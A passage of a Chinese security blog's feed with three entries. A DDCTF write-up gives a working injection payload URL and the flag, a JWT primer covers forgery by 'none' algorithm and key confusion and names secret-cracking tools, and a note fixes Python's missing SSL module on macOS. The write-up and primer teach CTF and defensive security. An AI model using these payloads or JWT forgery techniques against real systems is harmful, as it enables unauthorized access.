html</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">num_items = int(args[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">session[<span class="string">'num_items'</span>] += num_items </span><br><span class="line">trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException()</span><br><span class="line">session[<span class="string">'points'</span>] -= point_to_consume</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span>:</span></span><br><span class="line">flag = args[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'You naughty boy! ;) &lt;br /&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line"><span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">trigger_event(<span class="string">'func:show_flag;'</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">app.run(debug=<span class="literal">False</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><p>代码逻辑不难理解</p><p>解题思路是向 trigger_event 函数里传入数组，往队列里添加 get_flag,虽然页面得不到 flag 回显，但是 session 的 log 里会有记录</p><p>通过 <code>#</code>, eval 执行 trigger_event，也由 <code>#</code> 分割，传入buy_handler 和 get_flag </p><p>payload</p><p><code>http://116.85.48.107:5002/d5afe1f66147e857/?action:trigger_event%23;action:buy;10%23action:buy;10%23action:get_flag;0</code></p><p>flag : <code>DDCTF{3v41_3v3nt_100p_aNd_fLASK_c0Ok1e}</code></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读&lt;/p&gt;
    
    </summary>
    
    
      <category term="WriteUp" scheme="http://j0k3r.top/tags/WriteUp/"/>
    
      <category term="CTF" scheme="http://j0k3r.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>JSON Web Token（JWT）初探</title>
    <link href="http://j0k3r.top/2019/03/02/jwt-notes/"/>
    <id>http://j0k3r.top/2019/03/02/jwt-notes/</id>
    <published>2019-03-01T16:00:00.000Z</published>
    <updated>2020-03-26T10:18:44.539Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>JSON Web Token 是一个开放标准( RFC 7519 )，它定义了一种紧凑且独立的方式，以 JSON 对象的形式在各方之间安全地传输信息。</p></blockquote><a id="more"></a><h2 id="JWT简介"><a href="#JWT简介" class="headerlink" title="JWT简介"></a>JWT简介</h2><blockquote><p>不同的人对JWT也有着不同的看法，下面是我的理解</p></blockquote><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>简单来说，用户在经服务端认证成功后，返回一个带签名的json对象，此后用户的访问通信都由此json对象向服务端表明自己身份</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/jwt-notes.assets/5c7a4ac6c081e.png" alt></p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>服务器无需保存大量session数据，从有状态服务变为了无状态服务，这样有一个好处就是容易实现服务器的横向拓展，能够更好的实现负载均衡</li><li>数据共享性强，因为服务器不保存JWT，每台服务器都能获取用户信息，利于实现跨域认证</li><li>利于项目的前后端分离</li></ul><h2 id="JWT结构"><a href="#JWT结构" class="headerlink" title="JWT结构"></a>JWT结构</h2><p>JWT具体表现为一个 token 字符串，形如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE</span><br></pre></td></tr></table></figure><p>JWT由头部（header）、载荷（payload）与签名（signature）三部分组成，以“.”分割</p><p>前两部分可被 base64 解码为 json格式的字符串，签名则是通过指定算法对前两部分的加密所生成的信息，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure><p>JWT其实是URL-safe的，因为其可能会被用于在URL中传递，为了避免URL解析错误，JWT的base64稍有些不同，具体实现可参考如下php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">base64UrlEncode</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$data = base64_encode($string);</span><br><span class="line">$data = str_replace(<span class="keyword">array</span>(<span class="string">'+'</span>,<span class="string">'/'</span>,<span class="string">'='</span>),<span class="keyword">array</span>(<span class="string">'-'</span>,<span class="string">'_'</span>,<span class="string">''</span>),$data);</span><br><span class="line"><span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">base64UrlDecode</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">$data = str_replace(<span class="keyword">array</span>(<span class="string">'-'</span>,<span class="string">'_'</span>),<span class="keyword">array</span>(<span class="string">'+'</span>,<span class="string">'/'</span>),$string);</span><br><span class="line">$mod4 = strlen($data) % <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">if</span> ($mod4) &#123;</span><br><span class="line">      $data .= substr(<span class="string">'===='</span>, $mod4);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> base64_decode($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>示例：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"alg"</span>: <span class="string">"HS256"</span>,</span><br><span class="line">  <span class="attr">"typ"</span>: <span class="string">"JWT"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>alg 表示签名算法（algorithm），且默认是 HMAC SHA256，是一种使用单向散列函数来构造消息认证码的方法。</p><p>typ 表示类型，为与传统实现兼容，统一使用大写的JWT</p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>payload是JWT的核心内容，存放一些要传递的数据，可以定义私有字段</p><p>官方字段示例：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"iss"</span>: <span class="string">"xxx"</span></span><br><span class="line">  <span class="string">"sub"</span>: <span class="string">"xxx"</span>,</span><br><span class="line">  <span class="attr">"aud"</span>: <span class="string">"xxx"</span>,</span><br><span class="line">  <span class="attr">"exp"</span>: <span class="number">1551518526</span>,</span><br><span class="line">  <span class="attr">"nbf"</span>: <span class="number">1551514827</span>,</span><br><span class="line">  <span class="attr">"iat"</span>: <span class="number">1551514827</span>,</span><br><span class="line">  <span class="attr">"jti"</span>: <span class="string">"xxx"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>“iss” (Issuer) Claim</li><li>“sub” (Subject) Claim</li><li>“aud” (Audience) Claim</li><li>“exp” (Expiration Time) Claim</li><li>“nbf” (Not Before) Claim</li><li>“iat” (Issued At) Claim</li><li>“jti” (JWT ID) Claim</li></ul><p>一些敏感信息放在payload中可能会造成一些安全问题</p><h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>signature 是对前两部分的签名，防止数据篡改</p><p>其使用的 secret key 存在服务端</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">GenToken</span><span class="params">(array $header,array $payload)</span></span>&#123;</span><br><span class="line">$jwt_header = <span class="keyword">$this</span>-&gt;base64UrlEncode(json_encode($header));</span><br><span class="line">$jwt_payload = <span class="keyword">$this</span>-&gt;base64UrlEncode(json_encode($payload));</span><br><span class="line">$jwt_hap = $jwt_header.<span class="string">"."</span>.$jwt_payload;</span><br><span class="line">$signature = <span class="keyword">$this</span>-&gt;base64UrlEncode(hash_hmac(<span class="string">'sha256'</span>,$jwt_hap,<span class="keyword">$this</span>-&gt;secret_key,<span class="keyword">true</span>));</span><br><span class="line">$jwt_token = $jwt_hap.<span class="string">"."</span>.$signature;</span><br><span class="line">setcookie(<span class="string">"token"</span>,$jwt_token);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JWT-安全"><a href="#JWT-安全" class="headerlink" title="JWT 安全"></a>JWT 安全</h2><p>通过 <a href="https://jwt.io/" target="_blank" rel="noopener">jwt.io</a> 的 Debugger 验证和生成JWT</p><h3 id="使用“none”算法的JWT"><a href="#使用“none”算法的JWT" class="headerlink" title="使用“none”算法的JWT"></a>使用“none”算法的JWT</h3><p>部分JWT库在alg为none，signature为空时通过验证，以此可以构造任意payload欺骗服务器</p><p>漏洞示例：<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-1000531" target="_blank" rel="noopener">CVE-2018-1000531</a></p><h3 id="更改-RS256-为-HS256"><a href="#更改-RS256-为-HS256" class="headerlink" title="更改 RS256 为 HS256"></a>更改 RS256 为 HS256</h3><p>当服务器算法类型为 RS256 这种非对称加密算法时，如果修改算法类型为 HS256，服务器可能把原来的 public key 当作 secret key，此时我们就可以通过 HS256 算法用 public key 加密伪造的 payload 通过服务器验证</p><h3 id="爆破-secret-key"><a href="#爆破-secret-key" class="headerlink" title="爆破 secret key"></a>爆破 secret key</h3><p>如果服务器的密钥较短的话可以使用爆破</p><p>爆破工具：</p><p><a href="https://github.com/jmaxxz/jwtbrute" target="_blank" rel="noopener">jwtbrute</a></p><p><a href="https://github.com/Sjord/jwtcrack" target="_blank" rel="noopener">jwtcrack</a></p><p><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">JWT cracker</a></p><h2 id="使用JWT"><a href="#使用JWT" class="headerlink" title="使用JWT"></a>使用JWT</h2><p><strong>服务端</strong></p><p><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/ </a> 中已经列出了很多JWT的签名/验证库以供使用</p><p>如 pyjwt、python-jose、jsonwebtoken</p><p><strong>python-jose常用方法:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> jose <span class="keyword">import</span> jwt,jws,jwk</span><br><span class="line"><span class="keyword">from</span> jose.utils <span class="keyword">import</span> base64url_decode</span><br><span class="line"></span><br><span class="line">token = jwt.encode(&#123;<span class="string">'key'</span>: <span class="string">'value'</span>&#125;, <span class="string">'secret'</span>, algorithm=<span class="string">'HS256'</span>)</span><br><span class="line"><span class="keyword">print</span> token</span><br><span class="line"><span class="keyword">print</span> jwt.decode(token, <span class="string">'secret'</span>, algorithms=<span class="string">'HS256'</span>)</span><br><span class="line"></span><br><span class="line">signed = jws.sign(&#123;<span class="string">'a'</span>: <span class="string">'b'</span>&#125;, <span class="string">'secret'</span>, algorithm=<span class="string">'HS256'</span>)</span><br><span class="line"><span class="keyword">print</span> jws.verify(signed, <span class="string">'secret'</span>, algorithms=[<span class="string">'HS256'</span>])</span><br><span class="line"></span><br><span class="line">token = <span class="string">"eyJhbGciOiJIUzI1NiIsImtpZCI6IjAxOGMwYWU1LTRkOWItNDcxYi1iZmQ2LWVlZjMxNGJjNzAzNyJ9.SXTigJlzIGEgZGFuZ2Vyb3VzIGJ1c2luZXNzLCBGcm9kbywgZ29pbmcgb3V0IHlvdXIgZG9vci4gWW91IHN0ZXAgb250byB0aGUgcm9hZCwgYW5kIGlmIHlvdSBkb24ndCBrZWVwIHlvdXIgZmVldCwgdGhlcmXigJlzIG5vIGtub3dpbmcgd2hlcmUgeW91IG1pZ2h0IGJlIHN3ZXB0IG9mZiB0by4.s0h6KThzkfBBBkLspW1h84VsJZFTsPPqMDA7g1Md7p0"</span></span><br><span class="line"></span><br><span class="line">hmac_key = &#123;</span><br><span class="line">    <span class="string">"kty"</span>: <span class="string">"oct"</span>,</span><br><span class="line">    <span class="string">"kid"</span>: <span class="string">"018c0ae5-4d9b-471b-bfd6-eef314bc7037"</span>,</span><br><span class="line">    <span class="string">"use"</span>: <span class="string">"sig"</span>,</span><br><span class="line">    <span class="string">"alg"</span>: <span class="string">"HS256"</span>,</span><br><span class="line">    <span class="string">"k"</span>: <span class="string">"hJtXIZ2uSN5kbQfbtTNWbpdmhkV8FJG-Onbc6mxCcYg"</span></span><br><span class="line">&#125;</span><br><span class="line">key = jwk.construct(hmac_key)</span><br><span class="line">message, encoded_sig = token.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)</span><br><span class="line">decoded_sig = base64url_decode(str(encoded_sig))</span><br><span class="line"><span class="keyword">print</span> key.verify(message, decoded_sig)</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ2YWx1ZSJ9.FG<span class="number">-8</span>UppwHaFp1LgRYQQeS6EDQF7_6-bMFegNucHjmWg</span><br><span class="line">&#123;<span class="string">u'key'</span>: <span class="string">u'value'</span>&#125;</span><br><span class="line">&#123;<span class="string">"a"</span>:<span class="string">"b"</span>&#125;</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>python-jose 文档：</p><p><a href="https://python-jose.readthedocs.io/en/latest/index.html" target="_blank" rel="noopener">python-jose &mdash; python-jose 0.2.0 documentation</a></p><p><strong>利用 jsonwebtoken 实现 RS256 签发/效验 JWT</strong></p><p>生成私钥 </p><p><code>ssh-keygen -t rsa -b 4096 -f jwtRS256.key</code></p><p>生成公钥 </p><p><code>openssl rsa -in jwtRS256.key -pubout -outform PEM -out jwtRS256Public.key</code></p><p>安装 jsonwebtoken</p><p><code>sudo npm install jsonwebtoken</code></p><p>rs256.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">'jsonwebtoken'</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> payload = &#123;</span><br><span class="line">        name: <span class="string">'guest'</span>,</span><br><span class="line">        admin: <span class="string">'false'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pri = fs.readFileSync(<span class="string">'./jwtRS256.key'</span>)</span><br><span class="line"><span class="keyword">const</span> pub = fs.readFileSync(<span class="string">'./jwtRS256Public.key'</span>)</span><br><span class="line"><span class="keyword">const</span> token = jwt.sign(payload,pri,&#123;<span class="attr">algorithm</span>: <span class="string">'RS256'</span>&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(token)</span><br><span class="line"></span><br><span class="line">jwt.verify(token,pub,(error,decoded) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error.message)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(decoded)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/jwt-notes.assets/5c7a7efaeecd7.png" alt></p><p>如果需求简单可以参考</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">date_default_timezone_set(<span class="string">'Asia/Shanghai'</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JWT</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $secret_key = <span class="string">"your secret"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">base64UrlEncode</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$data = base64_encode($string);</span><br><span class="line">$data = str_replace(<span class="keyword">array</span>(<span class="string">'+'</span>,<span class="string">'/'</span>,<span class="string">'='</span>),<span class="keyword">array</span>(<span class="string">'-'</span>,<span class="string">'_'</span>,<span class="string">''</span>),$data);</span><br><span class="line"><span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">base64UrlDecode</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">$data = str_replace(<span class="keyword">array</span>(<span class="string">'-'</span>,<span class="string">'_'</span>),<span class="keyword">array</span>(<span class="string">'+'</span>,<span class="string">'/'</span>),$string);</span><br><span class="line">$mod4 = strlen($data) % <span class="number">4</span>;</span><br><span class="line">   <span class="keyword">if</span> ($mod4) &#123;</span><br><span class="line">       $data .= substr(<span class="string">'===='</span>, $mod4);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> base64_decode($data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">GenToken</span><span class="params">(array $header,array $payload)</span></span>&#123;</span><br><span class="line">$jwt_header = <span class="keyword">$this</span>-&gt;base64UrlEncode(json_encode($header));</span><br><span class="line">$jwt_payload = <span class="keyword">$this</span>-&gt;base64UrlEncode(json_encode($payload));</span><br><span class="line">$jwt_hap = $jwt_header.<span class="string">"."</span>.$jwt_payload;</span><br><span class="line"></span><br><span class="line">$signature = <span class="keyword">$this</span>-&gt;base64UrlEncode(hash_hmac(<span class="string">'sha256'</span>,$jwt_hap,<span class="keyword">$this</span>-&gt;secret_key,<span class="keyword">true</span>));</span><br><span class="line">$jwt_token = $jwt_hap.<span class="string">"."</span>.$signature;</span><br><span class="line">setcookie(<span class="string">"token"</span>,$jwt_token);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">VerToken</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">$token_data = explode(<span class="string">'.'</span>,$string);</span><br><span class="line">$jwt_hap = $token_data[<span class="number">0</span>].<span class="string">"."</span>.$token_data[<span class="number">1</span>];</span><br><span class="line">$signature = <span class="keyword">$this</span>-&gt;base64UrlEncode(hash_hmac(<span class="string">'sha256'</span>,$jwt_hap,<span class="keyword">$this</span>-&gt;secret_key,<span class="keyword">true</span>));</span><br><span class="line"><span class="keyword">if</span> ($signature === $token_data[<span class="number">2</span>])&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decodeTokenAndGetjwtpart</span><span class="params">($string,$part)</span></span>&#123;</span><br><span class="line">$token_data = explode(<span class="string">'.'</span>,$string);</span><br><span class="line"><span class="keyword">if</span> ($part === <span class="string">'header'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;base64UrlDecode($token_data[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($part === <span class="string">'payload'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;base64UrlDecode($token_data[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> flase;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isExpiration</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$json_pay_data = <span class="keyword">$this</span>-&gt;decodeTokenAndGetjwtpart($string,<span class="string">'payload'</span>);</span><br><span class="line">$exp = json_decode($json_pay_data)-&gt;exp;</span><br><span class="line"><span class="keyword">if</span> ($exp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (time()&gt;intval($exp))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$jwt = <span class="keyword">new</span> JWT();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最好使用HTTPS协议加密传输内容</p><p><strong>客户端</strong></p><p>用户的状态在服务端的内存中是不存储的，所以这是一种无状态的认证机制，数据储存在客户端。</p><p>如果不跨域，可将JWT放在Cookie中自动发送，跨越请求时将JWT放在POST数据中</p><p>较好的方式是放在Authorization请求字段中</p><p><code>Authorization: Bearer &lt;token&gt;</code></p><h3 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h3><p><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p><p><a href="https://tools.ietf.org/html/rfc7519" target="_blank" rel="noopener">RFC 7519 - JSON Web Token (JWT)</a></p><p><a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;JSON Web Token 是一个开放标准( RFC 7519 )，它定义了一种紧凑且独立的方式，以 JSON 对象的形式在各方之间安全地传输信息。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="JWT" scheme="http://j0k3r.top/tags/JWT/"/>
    
  </entry>
  
  <entry>
    <title>有关python 3.7 pip 出现 TLS/SSL not available</title>
    <link href="http://j0k3r.top/2019/02/17/SslNotAvailable/"/>
    <id>http://j0k3r.top/2019/02/17/SslNotAvailable/</id>
    <published>2019-02-16T16:00:00.000Z</published>
    <updated>2020-03-26T10:19:08.567Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>最近重装了macOS，半夜用python3发现这问题，结果弄到两点半。。</p></blockquote><a id="more"></a><p>起因是brew安装工具是由于依赖关系安装了python3.7，之后在我使用python3.7的pip安装模块时出现问题</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/SslNotAvailable.assets/5c685829d85f4.png" alt></p><p>明显是SSL模块不可用</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/SslNotAvailable.assets/5c685869c7792.png" alt></p><p>那就装呗，but，我几乎试遍网上方法也不管用</p><p>查看安装路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ brew --prefix openssl</span><br><span class="line">/usr/local/opt/openssl</span><br></pre></td></tr></table></figure><p>尝试带ssl重新编译安装python3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local/python37 --with-openssl=/usr/local/opt/openssl</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>依然是</p><p><code>ModuleNotFoundError: No module named &#39;_ssl&#39;</code></p><p>让 brew 强制链接 openssl 到环境变量</p><p><code>brew link openssl --force</code></p><p>但是 brew 拒绝链接，警告如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Warning: Refusing to link macOS-provided software: openssl</span><br><span class="line">If you need to have openssl first in your PATH run:</span><br><span class="line">  echo &apos;export PATH=&quot;/usr/local/opt/openssl/bin:$PATH&quot;&apos; &gt;&gt; ~/.zshrc</span><br><span class="line"></span><br><span class="line">For compilers to find openssl you may need to set:</span><br><span class="line">  export LDFLAGS=&quot;-L/usr/local/opt/openssl/lib&quot;</span><br><span class="line">  export 